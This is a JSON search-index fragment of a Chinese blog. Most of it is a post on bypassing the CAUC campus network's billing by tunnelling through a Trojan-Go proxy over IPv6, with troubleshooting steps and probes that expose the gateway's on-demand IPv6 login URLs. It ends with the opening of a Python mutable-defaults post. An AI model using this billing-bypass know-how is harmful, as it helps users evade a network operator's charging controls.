\u5f62\u5f0f\uff0880\u7aef\u53e3\uff09\u8bbf\u95ee\u7f51\u7ad9\u4e00\u5b9a\u6709\u54cd\u5e94\uff0c\u5982\u679c Trojan-Go \u914d\u7f6e\u5b8c\u5168\u6b63\u786e\u4f46 Nginx \u914d\u7f6e\u9519\u8bef\uff0c\u90a3\u4e48\u4f60\u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528 Trojan-Go \u5ba2\u6237\u7aef\u8fdb\u884c\u4ee3\u7406\uff0c\u4f46\u76f4\u63a5\u8bbf\u95ee\uff08\u5305\u62ec https \u548c http \uff09\u5219\u5747\u6ca1\u6709\u54cd\u5e94\u3002\u5982\u679c Trojan-Go \u548c Nginx \u90fd\u914d\u7f6e\u9519\u8bef\uff0c\u90a3\u4e48\u65e2\u4e0d\u80fd\u4ee3\u7406\uff0c\u4e5f\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee\uff08\u5305\u62ec https \u548c http\uff09\u3002 </li> <li> \u4f60\u670d\u52a1\u5668\u4e0a\u7684 Trojan-Go \u670d\u52a1\u7aef\u662f\u5426\u8fd0\u884c\u6b63\u5e38\uff1f \u540c\u4e0a\uff0c\u5982\u679c\u786e\u4fe1 Trojan-Go \u548c Nginx \u6ca1\u6709\u914d\u7f6e\u95ee\u9898\uff0c\u90a3\u4e48\u8bf7\u91cd\u542f\u670d\u52a1\u7aef\u548c\u5ba2\u6237\u7aef\u3002 </li> <li> \u4f60\u7684 Trojan-Go \u5ba2\u6237\u7aef\u7684\u914d\u7f6e\u662f\u5426\u6b63\u786e\uff1f \u5efa\u8bae\u4ed4\u7ec6\u5bf9\u7167\uff0c\u5982\u679c\u6709\u95ee\u9898\u5c31\u5bf9\u7740\u6539\u3002 </li> </ol> \u8fb9\u4e0a\u7684\u540c\u5b66\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u514d\u6d41\uff0c\u6211\u4f7f\u7528\u4e86\u548c\u4ed6\u4e00\u6a21\u4e00\u6837\u7684\u914d\u7f6e\uff0c\u4f46\u662f\u6211\u65e0\u6cd5\u8fde\u63a5\u3002 <p>\u8bf7\u5148\u65ad\u5f00\u4f60\u7684 Trojan-Go \u5ba2\u6237\u7aef\u7684\u8fde\u63a5\uff0c\u7136\u540e\u8bbf\u95ee\u4e00\u6b21 https://www.test-ipv6.com/\uff0c\u5982\u679c\u7f51\u7ad9\u6ca1\u6709\u663e\u793a\u4f60\u62e5\u6709 IPv6 \u5730\u5740\uff0c\u8bf7\u5237\u65b0\uff0c\u76f4\u5230\u7f51\u7ad9\u63d0\u793a\u4f60\u62e5\u6709\u516c\u7f51IPv6\u5730\u5740\u3002</p> <p>\u7136\u540e\u5173\u95ed\u9875\u9762\uff0c\u518d\u6b21\u6253\u5f00\u4f60\u6240\u7528\u7684 Trojan-Go \u5ba2\u6237\u7aef\u5e76\u8fde\u63a5\u5373\u53ef\u3002\u5982\u679c\u59cb\u7ec8\u6ca1\u6709\u63d0\u793a\u4f60\u62e5\u6709\u516c\u7f51 IP \u5730\u5740\uff0c\u8bf7\u53cd\u590d\u65ad\u5f00\u7136\u540e\u91cd\u65b0\u8fde\u63a5 WiFi\uff0c\u7136\u540e\u518d\u53bb\u4e0a\u8ff0\u7684\u7f51\u7ad9\u8fdb\u884c\u6d4b\u8bd5\uff0c\u76f4\u5230\u7f51\u7ad9\u63d0\u793a\u4f60\u62e5\u6709\u516c\u7f51IPv6\u5730\u5740\u4e3a\u6b62\u3002\uff08\u4e5f\u53ef\u4ee5\u53c2\u8003 1.3 IPv6 \u73af\u5883 \u8fd9\u4e00\u8282\u7684\u5185\u5bb9\u81ea\u67e5\uff09</p> <p>\u8fd9\u4e2a\u95ee\u9898\u5e38\u51fa\u73b0\u5728 iOS/iPad OS \u7cfb\u7edf\u4e0a\u3002\u8fd9\u901a\u5e38\u88ab\u8ba4\u4e3a\u662f\u4e00\u4e2a\u7384\u5b66\u95ee\u9898\u3002</p> \u4f7f\u7528\u8fc7\u7a0b\u4e2d\u8fde\u63a5\u4e2d\u65ad\uff0c\u68c0\u67e5\u670d\u52a1\u7aef\u53d1\u73b0\u670d\u52a1\u7aef\u5df2\u7ecf\u5d29\u6e83\uff0c\u91cd\u542f\u670d\u52a1\u7aef\u53ef\u4ee5\u6b63\u5e38\u4f7f\u7528\uff0c\u6211\u4f7f\u7528\u4e86 Linux \u4f5c\u4e3a\u670d\u52a1\u7aef\u64cd\u4f5c\u7cfb\u7edf\u3002 <p>\u89c1 #286 \u6700\u8fd1go\u662f\u4e0d\u662f\u5f88\u4e0d\u7a33\u5b9a\u554a\u3002\u7ecf\u5e38\u9700\u8981\u91cd\u542f\uff0c\u624d\u80fd\u8fde\u63a5\u3002\u4e00\u5806\u62a5\u9519\u3002\u3002\u8bf7\u5148\u5173\u95ed Trojan-Go \u670d\u52a1\u7aef\uff0c\u8f93\u5165</p> <pre><code>echo ulimit -n 40000 &gt;&gt; /etc/profile\nsource /etc/profile\n</code></pre> <p>\u7136\u540e\u518d\u6b21\u542f\u52a8\u670d\u52a1\u7aef\u3002\u8fd9\u6837\u53ef\u4ee5\u4f7f Trojan-Go \u670d\u52a1\u7aef\u4f7f\u7528\u9ad8\u8fbe 40000 \u4e2a fd\uff08\u6587\u4ef6\u6807\u8bc6\u7b26\uff09\u4ece\u800c\u4e0d\u518d\u56e0\u8d44\u6e90\u8017\u5c3d\u800c\u5d29\u6e83\u3002</p> <p>\uff08\u6ce8\uff1av0.9.0 \u5df2\u4fee\u590d\u8be5 issue\uff0c\u89c1 #313 Config: add LimitNOFILE to service files\uff09</p> \u7ecf\u5e38\u51fa\u73b0\u8fde\u63a5\u5361\u987f\uff0c\u4f46\u5e76\u672a\u5b8c\u5168\u4e2d\u65ad\uff0c\u6216\u8005\u4e0b\u8f7d\u65f6\u51fa\u73b0\u6587\u4ef6\u6821\u9a8c\u5931\u8d25\u3002 <p>\u8bf7\u5173\u95ed Mux \u591a\u8def\u590d\u7528\uff0c\u591a\u8def\u590d\u7528\u53ea\u80fd\u7528\u4e8e\u51cf\u5c11 TCP \u63e1\u624b\u5ef6\u8fdf\uff0c\u4f46\u4f1a\u5bf9\u541e\u5410\u91cf\u9020\u6210\u5f71\u54cd\uff08\u4f8b\u5982\u770b\u89c6\u9891\uff0c\u4e0b\u8f7d\u7b49\uff09\u3002</p> \u6211\u8fde\u63a5\u5230\u8282\u70b9\u4e4b\u540e\uff08\u6216\u6253\u5f00 Qv2ray \u8f6f\u4ef6\u4e4b\u540e\uff09\uff0c\u518d\u53bb\u6d4b\u8bd5 IPv6\uff0c\u5374\u53d1\u73b0\u4efb\u4f55\u7f51\u7ad9\u90fd\u6253\u4e0d\u5f00\u4e86\u3002 <p>\u8bf7\u77e5\u6089\uff1a</p> <ul> <li>\u5728 CAUC \u6821\u5185\uff0c\u7528\u6237\u5fc5\u987b\u5148\u8fdb\u884c IPv6 \u6d4b\u8bd5\u624d\u80fd\u83b7\u53d6\u5230 IPv6 \u5730\u5740\uff0c\u5426\u5219\u4f60\u65e0\u6cd5\u8fde\u63a5\u5230\u4efb\u4f55 IPv6 \u7f51\u7ad9\u3002</li> <li>\u5f53\u4f60\u548c\u4e00\u4e2a\u8282\u70b9\u5efa\u7acb\u8fde\u63a5\u4e4b\u540e\uff08\u6216\u8005\u8bf4\u5728\u4f60\u8bbe\u7f6e\u4ee3\u7406\u4e4b\u540e\uff09\uff0c\u4f60\u7684\u6d4f\u89c8\u5668\u59cb\u7ec8\u5c06\u4f1a\u901a\u8fc7\u8fd9\u4e2a\u4ee3\u7406\u8bbf\u95ee\u7f51\u7ad9\u3002</li> <li>\u672c\u6587\u6240\u8ff0\u7684 \u201c\u514d\u6d41\u201d \u539f\u7406\u662f\u901a\u8fc7 IPv6 \u7684\u4ee3\u7406\u5b9e\u73b0\u7684\u3002</li> </ul> <p>\u7ed3\u5408\u4ee5\u4e0a\u4e09\u70b9\uff0c\u4f60\u5e94\u8be5\u53ef\u4ee5\u7406\u89e3\uff0c\u5982\u679c\u4f60\u5728\u6d4b\u8bd5 IPv6 \u4e4b\u524d\u53bb\u8fde\u63a5\u8282\u70b9\uff0c\u90a3\u4e48\u4f60\u8fde\u63a5\u5230\u7684\u5e94\u8be5\u662f\u4e00\u4e2a\u6545\u969c\u7684\u8282\u70b9\uff08\u5373\u770b\u8d77\u6765\u8fde\u63a5\u4e0a\u4e86\uff0c\u4f46\u662f\u5176\u5b9e\u5e76\u6ca1\u6709\uff09\u3002\u4e8e\u662f\u4f60\u63a5\u4e0b\u6765\u8bbf\u95ee\u7684\u6240\u6709\u9875\u9762\u90fd\u662f\u6d4f\u89c8\u5668\u901a\u8fc7\u8fd9\u4e2a \u201c\u6545\u969c\u7684\u8282\u70b9\u201d \u5b9e\u73b0\u7684\uff0c\u5f88\u660e\u663e\u4f60\u65e0\u6cd5\u901a\u8fc7\u8fd9\u4e2a \u201c\u6545\u969c\u7684\u8282\u70b9\u201d \u8bbf\u95ee\u4efb\u4f55\u9875\u9762\u3002</p> <p>\u6b63\u786e\u7684\u89e3\u51b3\u65b9\u6cd5\u662f\uff1a\u65ad\u5f00\u5f53\u524d\u8282\u70b9\uff08\u70b9\u51fb Qv2ray \u9762\u677f\u4e0a <code>\u914d\u7f6e\u8be6\u60c5</code> \u53f3\u8fb9\u7684\u65b9\u5757\u56fe\u6807\uff08\u610f\u4e3a\u505c\u6b62\uff09\uff0c\u6216\u662f\u53f3\u952e\u5355\u51fb\u6258\u76d8\u56fe\u6807\uff0c\u9009\u62e9 <code>\u65ad\u5f00\u8fde\u63a5</code> \u6216 <code>\u9000\u51fa</code>\uff09\u3002\u5f85\u6d4b\u8bd5 IPv6 \u6b63\u5e38\u4e4b\u540e\u518d\u6253\u5f00 Qv2ray \u8fdb\u884c\u8fde\u63a5\u3002</p> <p>\u8bf7\u6ce8\u610f\uff1a\u6839\u636e Qv2ray \u9ed8\u8ba4\u8bbe\u7f6e\uff0c\u5f53\u4f60\u6253\u5f00 Qv2ray \u65f6\u4f1a\u81ea\u52a8\u8fde\u63a5\u5230\u6700\u540e\u4e00\u6b21\u8fde\u63a5\u8fc7\u7684\u8282\u70b9\uff0c\u56e0\u6b64\u8bf7\u4e0d\u8981\u5728\u6d4b\u8bd5 IPv6 \u4e4b\u524d\u6253\u5f00 Qv2ray\uff0c\u9664\u975e\u4f60\u77e5\u9053\u600e\u4e48\u624b\u52a8\u65ad\u5f00\u8282\u70b9\u8fde\u63a5\u3002</p>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#43","title":"4.3 \u5173\u4e8e\u6821\u56ed\u7f51 \u201c\u6309\u9700\u5206\u914d\u201d \u673a\u5236\u7684\u63a2\u7d22","text":"","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#431","title":"4.3.1 \u5f15\u8a00","text":"<p>\u8fd9\u662f\u4e00\u4e2a\u5f88\u6709\u610f\u601d\u7684\u4e1c\u897f\u3002\u4f60\u53ef\u80fd\u4f1a\u6709\u8fd9\u6837\u7684\u7591\u95ee\uff1a</p> <p>\u4e3a\u4ec0\u4e48\u6bcf\u6b21\u8fde\u63a5\u5230\u8282\u70b9\u4e4b\u524d\uff0c\u90fd\u5fc5\u987b\u8fdb\u884c\u6d4b\u8bd5\uff0c\u8fd9\u4e2a\u201c\u6d4b\u8bd5\u201d\u7684\u672c\u8d28\u7a76\u7adf\u662f\u4ec0\u4e48\uff1f\u7528\u610f\u662f\u4ec0\u4e48\uff1f</p> <p>\u9996\u5148\u544a\u8bc9\u4f60\uff0cCAUC \u6821\u56ed\u7f51\u7684 IPv6 \u8bbf\u95ee\u6743\u9650\u4e0d\u662f \u201c\u5929\u751f\u5177\u6709\u7684\u201d\uff0c\u800c\u662f \u201c\u6309\u9700\u5206\u914d\u7684\u201d\u3002\u8fd9\u662f\u4ec0\u4e48\u610f\u601d\u5462\uff1f\u4f60\u53ef\u4ee5\u8fd9\u6837\u6d4b\u8bd5\u4e00\u4e0b\uff1a</p> <ol> <li>\u8fde\u63a5\u5230 <code>CAUC-WIFI</code> \u6216 <code>CAUC-DORM</code>\uff0c\u5e76\u767b\u5f55\u3002</li> <li>\u8bbf\u95ee\u4f60\u5728 2.2.2 DNS \u914d\u7f6e \u4e2d\u5411 DNS \u89e3\u6790\u670d\u52a1\u5546\u63d0\u4f9b\u7684\u7eaf <code>AAAA</code> \u8bb0\u5f55\u57df\u540d\uff08\u5373\u7eaf IPv6 \u57df\u540d\uff0c\u4f8b\u5982\uff1a<code>ipv6.cauc.sb</code>\u3002\u6ce8\u610f\uff0c\u8bf7\u4e0d\u8981\u53bb\u8bbf\u95ee\u90a3\u4e9b\u6240\u8c13\u7684 IPv6 \u6d4b\u8bd5\u7f51\u7ad9\uff09\u3002</li> <li>\u6b64\u65f6\u4f60\u5c06\u53d1\u73b0 <code>ipv6.cauc.sb</code> \u8fd9\u4e2a\u57df\u540d\u65e0\u6cd5\u8fde\u63a5\uff08\u6216\u8005\u8bf4\u627e\u4e0d\u5230\u670d\u52a1\u5668\uff0c\u57df\u540d\u65e0\u6cd5\u89e3\u6790\u7b49\uff09\uff0c\u8fd9\u662f\u6bcb\u5eb8\u7f6e\u7591\u7684\u3002</li> <li>\u8bbf\u95ee https://www.test-ipv6.com/\uff0c\u76f4\u5230\u4f60\u83b7\u5f97\u516c\u7f51 IPv6 \u5730\u5740\u3002</li> <li>\u73b0\u5728\u4f60\u53ef\u4ee5\u8bbf\u95ee\u7b2c 2 \u6b65\u4e2d\u65e0\u6cd5\u8bbf\u95ee\u7684\u7eaf IPv6 \u57df\u540d\u3002</li> </ol> <p>\u663e\u7136\uff0c\u8bbf\u95ee\u7eaf IPv6 \u57df\u540d\u8fd9\u79cd \u201c\u80fd\u529b\u201d \u4e0d\u662f\u4f60 \u201c\u5929\u751f\u5177\u6709\u7684\u201d \uff0c\u800c\u770b\u8d77\u6765\u50cf\u662f test-ipv6.com \u8fd9\u4e2a\u7f51\u7ad9\u548c\u6821\u56ed\u7f51\u7f51\u5173\u534f\u5546\u540e\u8d4b\u4e88\u4f60\u7684\u3002</p>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#432","title":"4.3.2 \u5b9e\u9a8c\u9a8c\u8bc1","text":"<p>\u4e8b\u5b9e\u4e0a\uff0c\u6821\u56ed\u7f51\u786e\u5b9e\u53ef\u4ee5\u8bbf\u95ee IPv6\uff0c\u4f46\u8fd9\u4e2a \u201c\u80fd\u529b\u201d \u5e76\u4e0d\u4f1a\u8f7b\u6613\u8d4b\u4e88\u4f60\uff0c\u800c\u662f\u76f4\u5230\u5f53\u4f60\u9700\u8981\u8fd9\u4e2a \u201c\u80fd\u529b\u201d \u65f6\uff0c\u6821\u56ed\u7f51\u7f51\u5173\u624d\u4f1a\u8d4b\u4e88\u4f60\u8be5 \u201c\u80fd\u529b\u201d\u3002\u800c\u4f60\u901a\u8fc7 test-ipv6.com \u7b49\u7f51\u7ad9\u8fdb\u884c IPv6 \u6d4b\u8bd5\u65f6\uff0c\u7f51\u5173\u4f1a\u8ba4\u4e3a\u4f60 \u201c\u9700\u8981\u201d \u8fd9\u4e2a \u201c\u80fd\u529b\u201d\uff0c\u56e0\u6b64\u4f1a\u5c06\u5176\u8d4b\u4e88\u4f60\u3002</p> <p>\u7406\u7531\u662f\u6211\u4eec\u89c2\u5bdf\u5230\u4e86\u5982\u4e0b\u73b0\u8c61\uff1a</p> <p>\u5f53\u5728 test-ipv6.com \u6d4b\u8bd5 IPv6 \u8fd0\u8425\u5546\u65f6\uff08\u5373\u8bbf\u95ee <code>https://ipv6.lookup.test-ipv6.com/ip/?callback=?&amp;asn=1</code> \uff0c\u7eaf <code>AAAA</code> \u8bb0\u5f55\uff09\uff0c\u6d4f\u89c8\u5668\u5076\u5c14\u4f1a\u8df3\u8f6c\u5230\uff1a</p> <pre><code>http://192.168.100.200/1.htm?mv6={\u6b32\u5206\u914d\u7684IPv6\u5730\u5740}&amp;url=http://ipv6.lookup.test-ipv6.com/ip/?callback=?&amp;asn=1&amp;testdomain=test-ipv6.com&amp;testname=test_asn6\n</code></pre> <p>\u6211\u4eec\u79f0\u5176\u4e3a \u201c\u53ef\u7591\u7684URL1\u201d\uff0c\u7591\u4f3c\u662f\u901a\u8fc7 DNS \u52ab\u6301\u6216 301/302 \u91cd\u5b9a\u5411\u65b9\u5f0f\u8df3\u8f6c\u7684\u3002\u663e\u7136 <code>192.168.100.200</code> \u8be5IP\u5c5e\u4e8e\u6821\u56ed\u7f51\u5c40\u57df\u7f51\uff0c\u800c <code>http://192.168.100.200/1.htm</code> \u5c31\u662f\u65e7\u7248\u672c\u6821\u56ed\u7f51\u767b\u9646\u6210\u529f\u9875\u3002</p> <ol> <li>\u6211\u4eec\u8bb0\u5f55\u8fd9\u4e2a \u201c\u53ef\u7591\u7684URL1\u201d\uff0c\u7136\u540e\u5728 \u201cE\u822a\u5927\u201d \u5c0f\u7a0b\u5e8f\u4e2d\u6ce8\u9500\u8be5\u8bbe\u5907\uff0c\u6216\u662f\u76f4\u63a5\u5728\u767b\u5f55\u9875\u4e2d\u70b9\u51fb\u6ce8\u9500\u3002</li> <li>\u91cd\u65b0\u8fdb\u884c 4.3.1 \u5f15\u8a00 \u4e2d\u6d4b\u8bd5\u7684 1 \u81f3 3 \u6b65\u3002</li> <li>\u5c1d\u8bd5\u8bbf\u95ee \u201c\u53ef\u7591\u7684URL1\u201d\uff08\u800c\u4e0d\u662f\u53bb\u6d4b\u8bd5 IPv6\uff09\uff0c\u6b64\u65f6\u4f1a\u5f39\u51fa\u767b\u5f55\u6210\u529f\u9875\uff0c\u5982\u679c\u5f39\u51fa\u7684\u662f\u767b\u5f55\u9875\uff0c\u90a3\u4e48\u8bf7\u767b\u5f55\u3002</li> <li>\u518d\u6b21\u8fdb\u884c 4.3.1 \u5f15\u8a00 \u4e2d\u6d4b\u8bd5\u7684\u7b2c 3 \u6b65\u3002</li> <li>\u6b64\u65f6\u4f60\u53ef\u4ee5\u53d1\u73b0\u5df2\u7ecf\u62e5\u6709\u4e86 IPv6 \u8bbf\u95ee\u80fd\u529b\uff08\u5373\u4fbf\u6ca1\u6709\u53bb test-ipv6.com \u8fdb\u884c\u6d4b\u8bd5\uff09\uff0c\u800c\u5206\u914d\u7684 IPv6 \u516c\u7f51\u5730\u5740\u5c31\u662f \u201c\u53ef\u7591\u7684URL1\u201d \u4e2d\u7684 <code>mv6</code> \u53c2\u6570\u7684\u503c\u3002</li> </ol> <p>\u83b7\u53d6 IPv6 \u7684\u5173\u952e\u662f\u8bbf\u95ee\u8fd9\u4e2a \u201c\u53ef\u7591\u7684URL1\u201d\uff0c\u800c\u53bb test-ipv6.com \u8fdb\u884c\u6d4b\u8bd5\u76f8\u5f53\u4e8e\u53d8\u76f8\u5730\u8bbf\u95ee\u4e86\u8fd9\u4e2aURL\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u6211\u4eec\u8fd8\u89c2\u5bdf\u5230\uff0c\u8bbf\u95ee <code>192.168.4.252</code>\uff08\u6821\u56ed\u7f51\u767b\u5f55\u9875\uff09\u65f6\uff0c\u6d4f\u89c8\u5668\u4f1a\u8bd5\u56fe\u8bbf\u95ee <code>http://192.168.4.252/iv6={\u6b32\u5206\u914d\u7684IPv6\u5730\u5740}</code> \uff0c\u6211\u4eec\u628a\u5b83\u79f0\u4f5c \u201c\u53ef\u7591\u7684URL2\u201d\uff0c\u901a\u8fc7 F12 \u67e5\u770b\u7f51\u7edc\u8bf7\u6c42\u7684 header \u53ef\u4ee5\u53d1\u73b0\uff0c\u5176 <code>Referer</code> \u53c2\u6570\u7684\u503c\u4e3a <code>http://[2001:da8:a012:ff06::252]:9002/</code>\uff0c\u6211\u4eec\u79f0\u5176\u4e3a \u201c\u53ef\u7591\u7684URL3\u201d\u3002</p>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#433-ipv6","title":"4.3.3 IPv6 \u7248\u672c\u7684\u767b\u5f55\u9875","text":"<ol> <li>\u8fde\u63a5\u5230 <code>CAUC-WIFI</code> \u6216 <code>CAUC-DORM</code>\uff0c\u4f46\u4e0d\u767b\u9646\u3002</li> <li>\u8bbf\u95ee \u201c\u53ef\u7591\u7684URL3\u201d\uff0c\u5373 <code>http://[2001:da8:a012:ff06::252]:9002/</code>\u3002</li> <li>\u6b64\u65f6\u6d4f\u89c8\u5668\u4f1a\u51fa\u73b0\u767b\u5f55\u9875\uff0c\u5730\u5740\u680f\u663e\u793a <code>http://192.168.4.252/1.htm?mv6={\u6b32\u5206\u914d\u7684IPv6\u5730\u5740}&amp;url=</code> \u3002</li> <li>\u767b\u5f55\u3002</li> <li>\u8bbf\u95ee\u4f60\u5728\u7b2c\u4e94\u8282\u4e2d\u5411 DNS \u89e3\u6790\u670d\u52a1\u5546\u63d0\u4f9b\u7684\u7eaf <code>AAAA</code> \u8bb0\u5f55\u57df\u540d\uff0c\u4f60\u4f1a\u53d1\u73b0\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\uff0c\u800c\u4e0d\u9700\u8981\u5148\u8fdb\u884c IPv6 \u6d4b\u8bd5\uff0c\u8fd9\u610f\u5473\u7740\u4f60\u5728\u8fdb\u884c IPv6 \u6d4b\u8bd5\u524d\u4fbf\u83b7\u5f97\u4e86\u516c\u7f51 IPv6 \u5730\u5740\u3002</li> </ol> <p>\u770b\u8d77\u6765\u8fd9\u4e2a \u201c\u53ef\u7591\u7684URL3\u201d \u5b8c\u5168\u5c31\u50cf\u662f\u4e00\u4e2a IPv6 \u7248\u672c\u7684\u767b\u5f55\u9875\u3002</p> <p>\u7531\u4ee5\u4e0a\u591a\u4e2a\u6d4b\u8bd5\u6211\u4eec\u5f97\u51fa\u4ee5\u4e0b\u4e09\u70b9\u4e3b\u8981\u7ed3\u8bba\uff1a</p> <p>\u7ed3\u8bba</p> <ul> <li>\u6821\u56ed\u7f51\u672c\u8eab\u5177\u6709 IPv6 \u8bbf\u95ee\u80fd\u529b\uff0c\u4f46\u662f\u8fd9\u4e2a\u80fd\u529b\u662f\u6309\u9700\u5206\u914d\u7684\uff0c\u53ea\u6709\u5f53\u4f60\u9700\u8981\u8fde\u63a5\u7eaf <code>AAAA</code> \u8bb0\u5f55\u57df\u540d\u7684\u65f6\u5019\u624d\u6709\u53ef\u80fd\u8d4b\u4e88\u8fd9\u4e2a \u201c\u80fd\u529b\u201d \u7ed9\u4f60\u3002</li> <li>\u5728 test-ipv6.com \u6d4b\u8bd5 IPv6 \u516c\u7f51\u5730\u5740\u65f6\uff0c\u6709\u5927\u6982\u7387\u89e6\u53d1\u6821\u56ed\u7f51\u7f51\u5173\u7684 \u201c\u6309\u9700\u5206\u914d\u201d \u673a\u5236\uff0c\u6b64\u65f6\u6821\u56ed\u7f51\u5c06\u5206\u914d IPv6 \u516c\u7f51\u5730\u5740\u7ed9\u4f60\u3002</li> <li><code>http://[2001:da8:a012:ff06::252]:9002/</code> \u5c31\u662f\u6821\u56ed\u7f51\u7684 IPv6 \u7248\u672c\u7684\u767b\u5f55\u9875\uff0c\u901a\u8fc7\u8be5\u7f51\u9875\u8fdb\u884c\u7684\u6821\u56ed\u7f51\u767b\u5f55\u53ef\u4ee5\u76f4\u63a5\u83b7\u53d6 IPv6 \u516c\u7f51\u5730\u5740\u3002</li> </ul>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220902-python-mutable-defaults/","title":"Python \u9ed8\u8ba4\u53c2\u6570\u53ef\u53d8\u7684\u5371\u9669\u6027","text":"<p>\u6458\u8981</p> <p>\u8fd9\u4e24\u5929\u770b\u5230\u7684\u4e00\u7bc7\u53eb\u505a \u300a\u5f53\u5e74 1.6 \u4ebf\u7f8e\u91d1\u4f30\u503c\u7684\u516c\u53f8 \u2014\u2014 Digg \u662f\u5982\u4f55\u88ab\u4e00\u53e5 Python \u51fd\u6570\u53ef\u53d8\u9ed8\u53c2\u6bc1\u6389\u7684\u300b \u7684\u6587\u7ae0\uff0c\u5f15\u53d1\u4e86\u6211\u5bf9 Python \u9ed8\u8ba4\u53c2\u6570\u53ef\u53d8\u7684\u5371\u9669\u6027\u7684\u601d\u8003\u3002</p> <p>\u8fd9\u7bc7\u6587\u7ae0\u7684\u5185\u5bb9\u8bb2\u8ff0\u7684\u662f\uff0c\u5f53\u5e74\u66fe\u53ef\u4ee5\u4e0e Reddit \u5339\u654c\u7684\u79d1\u6280\u7f51\u7ad9 Digg\uff0c\u5728\u5b83\u7684\u65b0\u7248\u672c\uff08v4\uff09\u4ed3\u4fc3\u4e0a\u7ebf\u65f6\uff0c\u56e0\u4e3a Python \u9ed8\u8ba4\u53c2\u6570\u53ef\u53d8\u7684\u7279\u6027\u800c\u5bfc\u81f4\u4e86\u4e00\u4e2a\u5185\u5b58\u6cc4\u9732\u95ee\u9898\uff0c\u6700\u7ec8\u5728\u65b0\u4ea7\u54c1\u4e0a\u7ebf\u4e00\u4e2a\u6708\u4e4b\u540e\u4fee\u590d\u4e86\u8be5 Bug\u3002\u4f46\u4e00\u5207\u5df2\u7ecf\u665a\u4e86\uff0c\u8fd9\u4e2a Bug \u8ba9 Digg \u7684\u7528\u6237\u8fc5\u901f\u6d41\u5931\uff0c\u6700\u7ec8\u5728\u4e00\u5e74\u4ee5\u540e\u88ab Beatworks \u4ee5 50 \u4e07\u7f8e\u91d1\u7684\u4ef7\u683c\u6536\u8d2d\u3002</p> <p>\u8fd9\u4e2a\u6545\u4e8b\u4e5f\u88ab\u4eb2\u8eab\u7ecf\u5386\u8005 Will Larson \u8bb0\u8f7d\u4e8e \u300aDigg's v4 launch: an optimism born of necessity.\u300b\u3002</p> <p>\u8fd9\u7bc7\u6587\u7ae0\u5e76\u4e0d\u5206\u6790\u8fd9\u4e2a\u60b2\u5267\u7684\u6545\u4e8b\u53d1\u751f\u7684\u524d\u56e0\u540e\u679c\uff0c\u800c\u662f\u91cd\u70b9\u4ecb\u7ecd\u4e0e\u8ba8\u8bba Python \u9ed8\u8ba4\u53c2\u6570\u53ef\u53d8\u7684\u5371\u9669\u6027\u3002\u672c\u6587\u4e5f\u5c06\u4ece\u8fd9\u4e2a\u89d2\u5ea6\u6765\u5206\u6790\u8fd9\u4e2a\u95ee\u9898\uff0c\u4ee5\u53ca\u63a2\u8ba8\u5982\u4f55\u907f\u514d\u8fd9\u4e2a\u95ee\u9898\u3002</p>","tags":["python"]},{"location":"blog/2022/220902-python-mutable-defaults/#_1","title":"\u4e00\u3001\u4ec0\u4e48\u662f\u9ed8\u8ba4\u53c2\u6570\u53ef\u53d8","text":"<p>\u6211\u4eec\u901a\u8fc7 Digg \u5728\u5f15\u53d1\u8fd9\u6b21\u4e8b\u6545\u4e2d\u7684\u4e00\u884c\u6700\u5173\u952e\u7684\u4ee3\u7801\u4e3a\u4f8b\uff0c\u4ecb\u7ecd\u4ec0\u4e48\u662f\u9ed8\u8ba4\u53c2\u6570\u53ef\u53d8\uff1a</p> <pre><code>def get_user_by_ids(ids=[]):\n    ...\n</code></pre> <p>\u5728\u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u58f0\u660e\u4e86\u4e00\u4e2a\u51fd\u6570 <code>get_user_by_ids</code>\uff0c\u5b83\u6709\u4e00\u4e2a\u9ed8\u8ba4\u53c2\u6570 <code>ids</code>\uff0c\u9ed8\u8ba4\u503c\u4e3a\u4e00\u4e2a\u7a7a\u5217\u8868 <code>[]</code>\u3002\u8fd9\u4e2a\u51fd\u6570\u7684\u4f5c\u7528\u662f\u6839\u636e\u7528\u6237 ID \u5217\u8868 <code>ids</code> \u83b7\u53d6\u7528\u6237\u4fe1\u606f\u3002</p> <p>\u663e\u7136\uff0c\u6211\u4eec\u7684\u671f\u671b\u662f\uff0c\u6bcf\u6b21\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u65f6\uff0c\u5982\u679c\u6ca1\u6709\u4f20\u5165 <code>ids</code> \u53c2\u6570\uff0c\u90a3\u4e48 <code>ids</code> \u7684\u503c\u5c31\u662f\u4e00\u4e2a\u7a7a\u5217\u8868 <code>[]</code>\uff0c\u968f\u540e\u5728\u51fd\u6570\u4f53\u5185\u5bf9\u5f62\u53c2 <code>ids</code> \u8fdb\u884c\u64cd\u4f5c\uff08\u5982 <code>append</code> \u65b9\u6cd5\uff09\uff0c\u5747\u662f\u5728\u8fd9\u4e2a\u7a7a\u5217\u8868\u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u64cd\u4f5c\uff0c\u4f8b\u5982\uff1a</p> <pre><code>def get_user_by_ids(ids=[]):\n    ids.append(1)\n    print(ids)\n</code></pre> <p>\u671f\u671b\u7684\u7ed3\u679c\uff1a</p> <pre><code>&gt;&gt;&gt; get_user_by_ids()\n[1]\n&gt;&gt;&gt; get_user_by_ids()\n[1]\n&gt;&gt;&gt; get_user_by_ids()\n[1]\n</code></pre> <p>\u7136\u800c\u5b9e\u9645\u7684\u7ed3\u679c\u662f\uff1a <pre><code>&gt;&gt;&gt; get_user_by_ids()\n[1]\n&gt;&gt;&gt; get_user_by_ids()\n[1, 1]\n&gt;&gt;&gt; get_user_by_ids()\n[1, 1, 1]\n</code></pre></p> <p>\u53ef\u89c1\uff0c\u4f5c\u4e3a\u9ed8\u8ba4\u53c2\u6570\u7684\u5217\u8868 <code>[]</code> 